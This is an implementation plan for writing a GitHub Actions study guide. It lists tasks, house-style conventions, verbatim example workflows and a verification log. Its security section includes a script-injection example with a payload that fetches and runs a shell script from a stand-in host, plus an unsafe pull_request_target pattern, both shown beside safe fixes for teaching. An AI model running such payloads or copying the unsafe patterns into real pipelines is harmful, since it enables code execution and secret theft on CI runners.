# GitHub Actions Study Guide Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use Markdown checkbox syntax for tracking.

**Goal:** Write a depth-first, pattern-first GitHub Actions study guide (`GITHUB_ACTIONS_STUDY_GUIDE.md`) matching the repo's house style, and integrate it into `README.md` and `TOPICS.md`.

**Architecture:** A single markdown guide built one Part at a time (Parts 1–10 from the spec), each Part appended and committed independently. Examples are pattern-first and multi-stack (Node/Python/Go/Rust). Complete, runnable workflow examples are tagged with a leading `# .github/workflows/<name>.yml` comment so a final verification pass can extract and lint them with `actionlint`. Partial snippets that illustrate one feature are left untagged.

**Tech Stack:** Markdown (GitHub-flavored); YAML and shell in examples, with JS/TS and Dockerfile in the custom-actions Part; `actionlint` for verification (installed via `brew`).

**Spec:** `docs/superpowers/specs/2026-05-28-github-actions-guide-design.md`

---

## Conventions for every task

- **Append to** `GITHUB_ACTIONS_STUDY_GUIDE.md` (repo root). Do not rewrite earlier Parts.
- **House style** (match existing guides like `OBSERVABILITY_STUDY_GUIDE.md`, `GIT_STUDY_GUIDE.md`):
  - Numbered `## Part N — Title`, with `###` subsections.
  - Fenced code blocks with **inline `#` comments explaining each meaningful line**.
  - Prose explains *why* and tradeoffs, not just *how*. Be honest about footguns.
- **Complete-workflow tagging:** any code block that is a *full, valid workflow file* must start with a first-line comment naming its path, e.g. `# .github/workflows/ci.yml`. Partial snippets (illustrating one key like `strategy:`) must NOT carry that comment.
- **Action pinning:** in examples that demonstrate good practice (especially Part 6 onward), pin third-party actions to a full commit SHA with a trailing version comment, e.g. `uses: actions/checkout@<40-char-sha> # v4`. In early teaching examples (Parts 1–3) a major-version tag like `actions/checkout@v4` is fine for readability; add a one-line note in Part 1 that Part 7 explains why production code pins to SHAs. Use a clearly fake-but-well-formed 40-hex placeholder SHA (e.g. `a1b2c3d4...`) only if a real one isn't known, and say so in a note; prefer real pins where known.
- **Cross-references:** link to sibling guides where natural (Postgres/Redis service containers → those guides; image builds → Docker; ARC/deploys → Kubernetes; edge/static deploys → Cloudflare; OIDC trust → Cryptography). Use repo-relative links like `[Docker guide](DOCKER_STUDY_GUIDE.md)`.
- **Official documentation links:** Link inline to the canonical GitHub Actions docs (`https://docs.github.com/en/actions/...`) at the point each feature is introduced, and to canonical action repos (e.g. `https://github.com/actions/checkout`) when an action first appears. Match the inline density of the Ansible/Observability guides — a few per Part on the key terms, not one per sentence, and not a "Further Reading" dump. **GitHub periodically reorganizes the Actions docs IA, so confirm each link resolves and substitute the current canonical page if one 404s** (Task 12 Step 5 checks this). Suggested starting pages by Part (verify before use):
  - Part 1: `…/actions/about-github-actions/understanding-github-actions`
  - Part 2: events `…/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows`; contexts `…/actions/learn-github-actions/contexts`; expressions `…/actions/learn-github-actions/expressions`; workflow syntax reference
  - Part 3: caching `…/actions/using-workflows/caching-dependencies-to-speed-up-workflows`; matrix `…/actions/using-jobs/using-a-matrix-for-your-jobs`; artifacts `…/actions/using-workflows/storing-workflow-data-as-artifacts`; service containers `…/actions/using-containerized-services/about-service-containers`
  - Part 4: reusing workflows `…/actions/using-workflows/reusing-workflows`; composite `…/actions/creating-actions/creating-a-composite-action`
  - Part 5: creating actions index `…/actions/creating-actions`; JS, Docker, and metadata-syntax pages under it
  - Part 6: environments `…/actions/deployment/targeting-different-environments/using-environments-for-deployment`; OIDC `…/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect`; OIDC-in-AWS page; publishing `…/actions/publishing-packages`
  - Part 7: security hardening `…/actions/security-guides/security-hardening-for-github-actions`; secrets `…/actions/security-guides/using-secrets-in-github-actions`; automatic token `…/actions/security-guides/automatic-token-authentication`; permissions `…/actions/using-jobs/assigning-permissions-to-jobs`
  - Part 8: self-hosted `…/actions/hosting-your-own-runners`; ARC page under it; concurrency `…/actions/using-jobs/using-concurrency`; billing `…/billing/managing-billing-for-github-actions`; debug logging `…/actions/monitoring-and-troubleshooting-workflows/enabling-debug-logging`
  - Part 10: link back to the most relevant of the above per recipe rather than introducing new ones.
- **Per-task self-check before committing:** (a) all listed subsections present; (b) every complete workflow is tagged and well-formed YAML; (c) code comments explain each meaningful line; (d) the Part's entries already exist in the Table of Contents (created in Task 1); (e) inline official-doc links for this Part's key features are present and well-formed.
- **Commit** after each task with `git add GITHUB_ACTIONS_STUDY_GUIDE.md && git commit -m "<msg>"`. End every commit message with the Co-Authored-By trailer:
  ```
  Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>
  ```

---

## Task 1: Scaffold + Part 1 — Foundations & Mental Model

**Files:**
- Create: `GITHUB_ACTIONS_STUDY_GUIDE.md`

- [x] **Step 1: Create the file with title, intro, and full Table of Contents**

Write the `# GitHub Actions Study Guide` H1, a 2–4 sentence intro framing the guide (pattern-first, for engineers building real CI/CD), then a `## Table of Contents` linking to all ten Parts with their GitHub anchor slugs. Use these exact Part titles so anchors are stable:
1. Part 1 — Foundations & Mental Model
2. Part 2 — The Workflow Language
3. Part 3 — Build, Test, Cache, Artifacts
4. Part 4 — Composition & Reuse
5. Part 5 — Writing Custom Actions
6. Part 6 — Deployment & Release Automation
7. Part 7 — Security Hardening
8. Part 8 — Operations at Scale
9. Part 9 — Comparison to Alternatives
10. Part 10 — Recipes & End-to-End Walkthrough

- [x] **Step 2: Write Part 1 subsections**

Cover, in `###` subsections:
- **What CI/CD buys you** — fast feedback, repeatability, gating merges/deploys; define CI vs continuous delivery vs continuous deployment in 2–3 sentences each.
- **Where GitHub Actions fits** — one paragraph contrasting with Jenkins/GitLab/CircleCI at a high level; defer the deep comparison to Part 9.
- **The execution model** — events → workflows → jobs → steps → runners. Explain: a workflow is a YAML file in `.github/workflows/`; a job runs on a fresh ephemeral runner VM; steps in a job share that VM/filesystem; jobs are isolated from each other unless wired with `needs`/artifacts; what a runner is (GitHub-hosted vs self-hosted, forward-ref Part 8).
- **Repository layout** — `.github/workflows/*.yml`, multiple workflows per repo.
- **Note on pinning** — one line: teaching examples use version tags for readability; Part 7 explains why production pins to commit SHAs.

- [x] **Step 3: Write the "first workflow, dissected" example**

Include one complete, tagged workflow and then walk through it line-by-line in prose. Use:
```yaml
# .github/workflows/hello.yml
name: CI                      # shown in the Actions UI
on: [push]                    # run on every push to any branch
jobs:
  build:                      # job id (arbitrary)
    runs-on: ubuntu-latest    # GitHub-hosted runner image
    steps:
      - uses: actions/checkout@v4   # clones your repo into the runner
      - run: echo "Hello from ${{ github.sha }}"  # a shell step
```
Explain each line in prose beneath it.

- [x] **Step 4: Self-check and commit**

Run the per-task self-check. Then:
```bash
git add GITHUB_ACTIONS_STUDY_GUIDE.md
git commit -m "Add GitHub Actions guide: scaffold + Part 1 (foundations)"
```

---

## Task 2: Part 2 — The Workflow Language

**Files:**
- Modify: `GITHUB_ACTIONS_STUDY_GUIDE.md` (append `## Part 2 …`)

- [x] **Step 1: Triggers & events subsection**

Cover `on:` with worked snippets (partial snippets, untagged) for: `push`/`pull_request` with `branches`/`paths` filters; `schedule` with a cron string (explain the 5-field cron and that schedules run on the default branch); `workflow_dispatch` with typed `inputs` (string/choice/boolean) and how to read them via `inputs.*`; brief mention of `workflow_run` and `repository_dispatch`. Explain activity types (e.g. `pull_request: types: [opened, synchronize]`).

- [x] **Step 2: Jobs, steps, runners, the DAG subsection**

Explain `runs-on`; the common hosted images (`ubuntu-latest`, `windows-latest`, `macos-latest`); `needs:` to sequence jobs and form a DAG (include a 3-job fan-in snippet); job-level vs step-level `if:`; `uses:` vs `run:` steps; step `id` and `name`.

- [x] **Step 3: Contexts & expressions subsection**

Cover `${{ }}` interpolation; the key contexts (`github`, `env`, `vars`, `secrets`, `matrix`, `needs`, `job`, `runner`, `steps`); common functions (`contains`, `startsWith`, `fromJSON`, `toJSON`, `hashFiles`); status check functions (`success()`, `failure()`, `always()`, `cancelled()`); a worked `if:` example combining a context and a function. Include a step-output example: a step sets `echo "name=value" >> "$GITHUB_OUTPUT"` and a later step reads `${{ steps.<id>.outputs.name }}`.

- [x] **Step 4: Env, defaults, shells subsection**

Cover env at workflow/job/step scope and precedence; `defaults.run` (`shell`, `working-directory`); the default shell per OS; `$GITHUB_ENV` for exporting env between steps. First look at `GITHUB_TOKEN` and `permissions:` (one short paragraph + a `permissions: { contents: read }` snippet) with a forward-reference to Part 7 for the full treatment.

- [x] **Step 5: Self-check and commit**

```bash
git add GITHUB_ACTIONS_STUDY_GUIDE.md
git commit -m "Add GitHub Actions guide: Part 2 (workflow language)"
```

---

## Task 3: Part 3 — Build, Test, Cache, Artifacts

**Files:**
- Modify: `GITHUB_ACTIONS_STUDY_GUIDE.md`

- [x] **Step 1: setup-* across ecosystems subsection (pattern-first, multi-stack)**

Show concise per-ecosystem build/test job snippets: `actions/setup-node` (with `cache: npm`), `actions/setup-python` (with `cache: pip`), `actions/setup-go` (built-in module cache), and a Rust toolchain (`dtolnay/rust-toolchain@stable` + `Swatinem/rust-cache`). Emphasize the common shape across languages.

- [x] **Step 2: Caching subsection**

Explain `actions/cache`: `path`, `key`, `restore-keys`, using `hashFiles('**/package-lock.json')` in keys; cache scoping by branch and the base-branch fallback; immutability of a written key; size/eviction limits; when the `setup-*` built-in cache is enough vs when you need explicit `actions/cache`. Include one explicit `actions/cache` snippet.

- [x] **Step 3: Matrix builds subsection**

Show a `strategy.matrix` over OS × language-version; `include`/`exclude`; `fail-fast: false`; `max-parallel`. Then show a **dynamic matrix**: a job that emits JSON to `$GITHUB_OUTPUT` and a dependent job using `strategy.matrix: ${{ fromJSON(needs.<id>.outputs.matrix) }}`.

- [x] **Step 4: Artifacts & inter-job data subsection**

Show `actions/upload-artifact` and `actions/download-artifact` (note v4 behavior/retention); contrast artifacts (files, cross-job, downloadable) with job `outputs` (small strings, via `needs`). Give a build-job→deploy-job artifact handoff snippet.

- [x] **Step 5: Service containers subsection**

Show a test job using `services:` for Postgres and Redis: image, `env` (e.g. `POSTGRES_PASSWORD`), `ports`, and `options` health checks; explain how steps reach them at `localhost:<port>`. Cross-link `[Postgres guide](POSTGRES_STUDY_GUIDE.md)` and `[Redis guide](REDIS_STUDY_GUIDE.md)`.

- [x] **Step 6: Self-check and commit**

```bash
git add GITHUB_ACTIONS_STUDY_GUIDE.md
git commit -m "Add GitHub Actions guide: Part 3 (build, test, cache, artifacts)"
```

---

## Task 4: Part 4 — Composition & Reuse

**Files:**
- Modify: `GITHUB_ACTIONS_STUDY_GUIDE.md`

- [x] **Step 1: Reusable workflows subsection**

Show a complete reusable workflow tagged `# .github/workflows/reusable-build.yml` with `on: workflow_call:` declaring typed `inputs`, `secrets`, and `outputs`; then a caller workflow that `uses: ./.github/workflows/reusable-build.yml` with `with:` and `secrets: inherit`. Explain nesting limits (max chain depth) and that `uses` at job level calls a workflow.

- [x] **Step 2: Composite actions subsection**

Show a local composite action at `# .github/actions/setup-project/action.yml` with `runs.using: composite` and a couple of steps (note composite steps need `shell:`), plus a workflow step that `uses: ./.github/actions/setup-project`.

- [x] **Step 3: Org-level reuse subsection**

Explain starter workflows (org `.github` repo, `workflow-templates/`) and required workflows / rulesets enforcing checks across repos. Prose-level; one short config snippet.

- [x] **Step 4: Decision guide subsection**

A short comparison: reusable workflow (whole jobs, runs as its own jobs) vs composite action (a bundle of steps inside one job) vs custom action (Part 5, distributable unit). Include a 3-row table or bullet list with "reach for X when…".

- [x] **Step 5: Self-check and commit**

```bash
git add GITHUB_ACTIONS_STUDY_GUIDE.md
git commit -m "Add GitHub Actions guide: Part 4 (composition & reuse)"
```

---

## Task 5: Part 5 — Writing Custom Actions

**Files:**
- Modify: `GITHUB_ACTIONS_STUDY_GUIDE.md`

- [x] **Step 1: The three kinds subsection**

Explain composite vs JavaScript vs Docker-container actions and their tradeoffs (startup speed, language freedom, runner-OS constraints — Docker actions are Linux-only on hosted runners). A short table.

- [x] **Step 2: action.yml anatomy subsection**

Document `name`, `description`, `inputs` (with `required`/`default`), `outputs`, `runs`, and `branding`.

- [x] **Step 3: Worked JavaScript action**

Show a complete `# action.yml` (`runs.using: node20`, `main: dist/index.js`) and a `# index.js` using `@actions/core` (`getInput`, `setOutput`, `setFailed`) and `@actions/github` (read `context`). Explain the build step: bundle with `@vercel/ncc` into `dist/` and commit it (or build in release CI), and why `dist/` must be committed for `uses:`-by-ref to work.

- [x] **Step 4: Worked Docker-container action**

Show a `# action.yml` (`runs.using: docker`, `image: Dockerfile`), a minimal `# Dockerfile`, and a `# entrypoint.sh` that reads inputs from `INPUT_*` env vars and writes outputs to `$GITHUB_OUTPUT`.

- [x] **Step 5: Versioning & distribution subsection**

Explain semver release tags, the floating major-tag convention (`v1` re-pointed to each `v1.x.y`), how consumers reference `@v1` vs a SHA, and publishing to the Marketplace (release + metadata). Tie pinning back to Part 7.

- [x] **Step 6: Self-check and commit**

```bash
git add GITHUB_ACTIONS_STUDY_GUIDE.md
git commit -m "Add GitHub Actions guide: Part 5 (writing custom actions)"
```

---

## Task 6: Part 6 — Deployment & Release Automation

**Files:**
- Modify: `GITHUB_ACTIONS_STUDY_GUIDE.md`

- [x] **Step 1: Environments subsection**

Explain deployment environments: protection rules, required reviewers, wait timers, environment-scoped secrets/vars, and deployment branch restrictions. Show a job using `environment: production` and reading an environment secret.

- [x] **Step 2: Secrets & variables subsection**

Cover repo/environment/org scope; `secrets` vs `vars`; automatic log masking and its limits (multiline/encoded secrets can leak); **why fork PRs do not receive secrets**; external secret managers (forward-ref OIDC + Vault below). Keep it tight; the security depth is Part 7.

- [x] **Step 3: OIDC to cloud (in depth) — AWS worked example**

Explain the OIDC trust model: the workflow requests a short-lived OIDC token from GitHub; the cloud trusts GitHub's OIDC provider and exchanges it for short-lived credentials; **no long-lived cloud keys stored as secrets**. Explain the JWT `sub` claim and scoping trust to a repo/branch/environment. Then show, verbatim:

The AWS IAM role trust policy (JSON):
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::<ACCOUNT_ID>:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
      },
      "StringLike": {
        "token.actions.githubusercontent.com:sub": "repo:<ORG>/<REPO>:ref:refs/heads/main"
      }
    }
  }]
}
```
The workflow:
```yaml
# .github/workflows/deploy-aws.yml
name: Deploy to AWS
on:
  push:
    branches: [main]
permissions:
  id-token: write      # REQUIRED to request the OIDC token
  contents: read       # least privilege for the rest
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::<ACCOUNT_ID>:role/github-actions-deploy
          aws-region: us-east-1
      - run: aws sts get-caller-identity   # proves creds work; replace with real deploy
```
Then add a short "variants" note: Azure via `azure/login` (`federated` credential), GCP via Workload Identity Federation, Cloudflare, and HashiCorp Vault's JWT auth. Cross-link `[Cryptography guide](CRYPTO_FUNDAMENTALS.md)` for the token/JWT background and `[Azure guide](AZURE_FOR_AWS_SOLUTIONS_ARCHITECT.md)` / `[Cloudflare guide](CLOUDFLARE_STUDY_GUIDE.md)`.

- [x] **Step 4: Deploy patterns subsection**

Show/describe: deploying a container image, a static site, and to Kubernetes (cross-link `[Kubernetes guide](k8s/KUBERNETES_STUDY_GUIDE.md)`); gating with `environment:` and using `concurrency:` to prevent overlapping deploys (forward-ref Part 8 for concurrency depth).

- [x] **Step 5: Release & publishing automation subsection**

Cover tag-driven releases (`on: push: tags: ['v*']`), auto-generated release notes / changelogs, semver. Show a GHCR image publish (login + `docker/build-push-action`) and **at least one** library publish among npm (`npm publish` with `NODE_AUTH_TOKEN` or OIDC trusted publishing), PyPI (trusted publishing via OIDC, `pypa/gh-action-pypi-publish`), or crates.io (`cargo publish`). Prefer the PyPI OIDC trusted-publishing example to reinforce the OIDC theme.

- [x] **Step 6: Self-check and commit**

```bash
git add GITHUB_ACTIONS_STUDY_GUIDE.md
git commit -m "Add GitHub Actions guide: Part 6 (deployment & release automation)"
```

---

## Task 7: Part 7 — Security Hardening

**Files:**
- Modify: `GITHUB_ACTIONS_STUDY_GUIDE.md`

- [x] **Step 1: Threat model subsection**

What a malicious PR or a compromised third-party action can do: steal secrets, push code, mint cloud creds, poison caches/artifacts. Frame the rest of the Part around these.

- [x] **Step 2: pull_request vs pull_request_target subsection**

Explain that `pull_request` from a fork runs with a read-only token and **no secrets**, against the PR's merge commit; `pull_request_target` runs in the **base** repo's context **with secrets and a writable token** but checks out base code by default — and the footgun is checking out + executing untrusted PR code under that privileged context. Show an **unsafe** pattern (checks out `github.event.pull_request.head.sha` then runs its build under `pull_request_target`) and a **safe** pattern (use `pull_request` for build/test; reserve `pull_request_target` for trusted, code-free tasks like labeling, and never check out + run untrusted head code with secrets).

- [x] **Step 3: Script injection subsection**

Show the **unsafe** pattern interpolating untrusted input directly into a shell:
```yaml
# UNSAFE — do not do this
- run: echo "Title: ${{ github.event.pull_request.title }}"
```
Explain that a PR title like `$(curl evil.sh | sh)` (or backticks) executes on the runner. Show the **safe** fix — pass via `env:` and reference the shell variable, which is not evaluated as workflow expression:
```yaml
# SAFE
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

- [x] **Step 4: Pinning third-party actions subsection**

Explain tags are mutable (an attacker who controls an action repo can move `v3` to malicious code) and that pinning to a full 40-char commit SHA is the mitigation. Show `uses: actions/checkout@<sha> # v4`. Show a Dependabot config to keep pins current:
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
```

- [x] **Step 5: Least privilege subsection**

Explain the default `GITHUB_TOKEN` permissions and how to set the repo/org default to read-only, then grant per-workflow/per-job. Show a workflow-level `permissions: { contents: read }` and a job that escalates only what it needs (e.g. `packages: write` for a publish job, `id-token: write` for OIDC).

- [x] **Step 6: Secrets exposure & supply chain subsection**

Cover: log-masking limits; forks not getting secrets (tie back to Part 6); not passing secrets to untrusted steps; allowed-actions org policy (restrict to verified/SHA-pinned); artifact attestations / build provenance (`actions/attest-build-provenance`); reviewing transitive risk of third-party actions.

- [x] **Step 7: Self-check and commit**

```bash
git add GITHUB_ACTIONS_STUDY_GUIDE.md
git commit -m "Add GitHub Actions guide: Part 7 (security hardening)"
```

---

## Task 8: Part 8 — Operations at Scale

**Files:**
- Modify: `GITHUB_ACTIONS_STUDY_GUIDE.md`

- [x] **Step 1: Hosted vs self-hosted subsection**

When to switch: special hardware/GPU, private-network access, cost at scale, custom OS. Tradeoffs.

- [x] **Step 2: Self-hosted runners subsection**

Registration sketch (the `config.sh` + `run.sh` flow at a high level), runner labels/`runs-on` targeting, and the **critical caveat**: never attach a self-hosted runner to a public repo that accepts fork PRs (forks could run arbitrary code on your infrastructure). Recommend **ephemeral** runners (`--ephemeral`, one job per runner) for isolation.

- [x] **Step 3: Autoscaling with ARC subsection**

Explain Actions Runner Controller on Kubernetes: runner scale sets that scale pods with demand. Show a short `helm`/values sketch for an `AutoscalingRunnerSet` (min/max runners, GitHub config URL, auth). Cross-link `[Kubernetes guide](k8s/KUBERNETES_STUDY_GUIDE.md)`. Mention larger hosted runners and runner groups as the simpler alternatives.

- [x] **Step 4: Concurrency subsection**

Show `concurrency:` with a `group:` expression and `cancel-in-progress: true` (e.g. cancel superseded CI on a branch), and a deploy example that must NOT cancel mid-deploy (`cancel-in-progress: false`) to serialize prod deploys.

- [x] **Step 5: Cost & optimization subsection**

What's free (public repos / included minutes) vs billed; per-OS minute multipliers (macOS/Windows cost more); cutting runtime via caching, right-sized matrices, path filters, and skipping redundant runs.

- [x] **Step 6: Debugging subsection**

Re-running jobs (incl. failed-only); step-debug logging via the `ACTIONS_STEP_DEBUG` secret/variable; interactive SSH with `mxschmitt/action-tmate`; running workflows locally with `act` (note Docker requirement and fidelity caveats). Cross-link `[Docker guide](DOCKER_STUDY_GUIDE.md)`.

- [x] **Step 7: Self-check and commit**

```bash
git add GITHUB_ACTIONS_STUDY_GUIDE.md
git commit -m "Add GitHub Actions guide: Part 8 (operations at scale)"
```

---

## Task 9: Part 9 — Comparison to Alternatives

**Files:**
- Modify: `GITHUB_ACTIONS_STUDY_GUIDE.md`

- [x] **Step 1: Comparison subsection**

A comparison table + prose covering GitLab CI/CD, CircleCI, Jenkins, Buildkite, and Dagger: model, where each wins, where Actions wins. Be honest (e.g. Jenkins' plugin ecosystem and self-hosting maturity; GitLab's integrated DevOps platform; Dagger's portable/local pipelines).

- [x] **Step 2: Migration & "when not to use Actions" subsection**

Brief migration notes for the two most common sources (GitLab CI `.gitlab-ci.yml` → workflows; Jenkinsfile → workflows): map stages→jobs, agents→runs-on, etc. Add a short "when *not* to reach for Actions" note (e.g. heavy non-GitHub-hosted source, complex existing Jenkins estate).

- [x] **Step 3: Self-check and commit**

```bash
git add GITHUB_ACTIONS_STUDY_GUIDE.md
git commit -m "Add GitHub Actions guide: Part 9 (comparison to alternatives)"
```

---

## Task 10: Part 10 — Recipes & End-to-End Walkthrough

**Files:**
- Modify: `GITHUB_ACTIONS_STUDY_GUIDE.md`

- [x] **Step 1: Five recipes subsection**

Each recipe = a complete, tagged workflow + brief commentary:
1. `# .github/workflows/ci.yml` — lint + test + build **matrix** across language versions and OSes.
2. `# .github/workflows/monorepo-ci.yml` — cached monorepo CI using `paths` filters / change detection (e.g. `dorny/paths-filter`) to run only affected packages.
3. `# .github/workflows/release-image.yml` — build and push a container image to GHCR with build **provenance/attestation** (`docker/build-push-action` + `actions/attest-build-provenance`, `packages: write` + `id-token: write`).
4. `# .github/workflows/deploy-oidc.yml` — OIDC deploy to AWS with no stored credentials (reuse the Part 6 pattern, condensed).
5. `# .github/workflows/publish.yml` — auto-publish a library to a registry on tag push.

- [x] **Step 2: End-to-end walkthrough subsection**

Narrate building a real pipeline for a containerized service from empty repo to production, decision by decision: PR validation (lint/test/matrix) → build & push image on merge to `main` → deploy to **staging** automatically → promote to **production** via a protected environment with a required reviewer. Show the key workflow file(s) (tagged) and explain why each protection/gate is there. Reference earlier Parts rather than re-teaching.

- [x] **Step 3: Self-check and commit**

```bash
git add GITHUB_ACTIONS_STUDY_GUIDE.md
git commit -m "Add GitHub Actions guide: Part 10 (recipes & end-to-end walkthrough)"
```

---

## Task 11: Integrate into README and prune TOPICS

**Files:**
- Modify: `README.md`
- Modify: `TOPICS.md`

- [x] **Step 1: Add the README entry**

In `README.md`, under `## Guides`, insert a new `### GitHub Actions` entry in alphabetical position (between `### Dotnet for Python Developers` and `### Golang for Python Developers`). Match the existing format exactly: a 2–4 sentence description, a blank line, then `[Open on GitHub](https://github.com/s4njee/larning/blob/main/GITHUB_ACTIONS_STUDY_GUIDE.md)`. Description should mention: pattern-first/multi-stack, the core workflow model, security hardening, custom actions, OIDC deploys, release automation, self-hosted/ARC scaling, the alternatives comparison, and the recipes + end-to-end walkthrough.

- [x] **Step 2: Prune TOPICS.md**

In `TOPICS.md`, delete the bullets for topics that now have guides:
- `GitHub Actions` (Systems & Infrastructure)
- `Docker (Deep)` (Systems & Infrastructure)
- `TypeScript (Deep)` (Languages)
- `Redis` (Data & ML)
- `LLM Application Development` (Data & ML)
- `Git (Deep)` (Tools)

Leave the section headers and all other bullets intact. Verify no other bullet references these as still-missing.

- [x] **Step 3: Commit**

```bash
git add README.md TOPICS.md
git commit -m "Integrate GitHub Actions guide into README; prune completed topics from TOPICS"
```

---

## Task 12: Verification

**Files:**
- None modified (verification only; fixes go back into the relevant Part if needed)

Verification result, 2026-06-03:

- `actionlint` 1.7.12 was present on PATH.
- Extracted 12 complete `# .github/workflows/...` examples and `actionlint`
  exited 0.
- Confirmed all 10 Parts are present and generated HTML heading ids match the
  markdown Table of Contents links.
- Fixed stale double-hyphen Part anchors in `GITHUB_ACTIONS_STUDY_GUIDE.md`.
- Spot-checked the spec coverage requirements: multi-stack examples, OIDC/AWS,
  security hardening topics, the five recipes, and the end-to-end walkthrough.
- Checked 29 unique `docs.github.com` links; all returned HTTP 200.
- Final guide length: 1,479 lines.
- Commit history contains the expected Part commits plus the README/TOPICS
  integration commit.

- [x] **Step 1: Install actionlint**

Run: `brew install actionlint`
Expected: actionlint on PATH (`actionlint --version` prints a version).

- [x] **Step 2: Extract complete workflow examples and lint them**

Extract every fenced ```yaml block whose first line is `# .github/workflows/…` into a temp workspace and lint. Run:
```bash
cd /Users/sanjee/Documents/projects/study_guides
python3 - <<'PY'
import re, pathlib, subprocess, sys, tempfile, os
text = pathlib.Path("GITHUB_ACTIONS_STUDY_GUIDE.md").read_text()
blocks = re.findall(r"```yaml\n(.*?)```", text, re.S)
wf = [b for b in blocks if b.lstrip().startswith("# .github/workflows/")]
tmp = tempfile.mkdtemp()
os.makedirs(f"{tmp}/.github/workflows", exist_ok=True)
for i, b in enumerate(wf):
    first = b.splitlines()[0]
    name = first.split("/")[-1].strip() or f"wf{i}.yml"
    pathlib.Path(f"{tmp}/.github/workflows/{name}").write_text(b)
print(f"Extracted {len(wf)} complete workflows to {tmp}")
subprocess.run(["git", "init", "-q"], cwd=tmp, check=True)  # actionlint needs a git project root
r = subprocess.run(["actionlint"], cwd=tmp)
sys.exit(r.returncode)
PY
```
Expected: exit 0, no lint errors. If actionlint reports errors, fix the corresponding example in the guide (re-open the relevant Part, correct the YAML/expression/shell, re-commit that Part) and re-run.

- [x] **Step 3: Spec-coverage read-through**

Open `docs/superpowers/specs/2026-05-28-github-actions-guide-design.md` and confirm every item in its **Acceptance Criteria** and **Worked-Example Inventory** is present in the guide. Specifically verify: all 10 Parts present; examples span Node/Python/Go/Rust; all four heavy topics have worked examples (not just prose); the AWS OIDC trust policy + workflow are complete; the security Part covers `pull_request_target`, script injection, SHA-pinning, and least-privilege `permissions`; the five recipes + end-to-end walkthrough are present; README and TOPICS are updated. Fix any gap by amending the relevant Part and committing.

- [x] **Step 4: TOC consistency check**

Confirm every `## Part N` heading has a matching Table of Contents link and the anchors resolve (slugs match headings). Fix mismatches.

- [x] **Step 5: Official-documentation link check**

Extract all unique `docs.github.com` links and best-effort verify they resolve:
```bash
cd /Users/sanjee/Documents/projects/study_guides
grep -oE 'https://docs\.github\.com/[^) ]+' GITHUB_ACTIONS_STUDY_GUIDE.md | sort -u | while read -r url; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -L --max-time 15 "$url" || echo ERR)
  echo "$code  $url"
done
```
Expected: every line is `200`. A `404`/`301`-to-404 means the page moved — fix the link in the relevant Part and re-commit it. `ERR`/`000` means the network was unavailable in this environment (not a link defect) — note it and re-verify with network access if possible. Also confirm the count of `docs.github.com` links is non-zero and spread across Parts (not all in one place).

- [x] **Step 6: Final confirmation**

Run: `git log --oneline` and confirm one commit per Part plus the integration commit. Report the guide's final line count (`wc -l GITHUB_ACTIONS_STUDY_GUIDE.md`), the actionlint result, and the link-check summary. Do not claim completion unless Step 2 exited 0, Step 3 found no gaps, and Step 5 found no `404`s (network-unavailable `ERR` is acceptable but must be reported).

---

## Self-Review (performed during planning)

- **Spec coverage:** All 10 Parts → Tasks 1–10. README/TOPICS deliverables → Task 11. Acceptance criteria + worked-example inventory → verified in Task 12 Step 3. OIDC AWS example, `pull_request_target`, script injection, SHA-pinning, least-privilege → Tasks 6–7 with verbatim code. Recipes + walkthrough → Task 10. ✓
- **Placeholder scan:** Security-critical and easy-to-get-wrong examples (OIDC trust policy + workflow, script-injection safe/unsafe, SHA-pin + Dependabot, least-privilege permissions, first workflow) are given verbatim. Routine examples are specified precisely enough to write unambiguously. No "TBD"/"handle edge cases"/"similar to Task N". ✓
- **Consistency:** The `# .github/workflows/<name>.yml` complete-workflow tagging convention is defined once (Conventions) and consumed by the Task 12 extraction script; recipe filenames in Task 10 match that convention. Anchor/Part titles fixed in Task 1 and reused. ✓
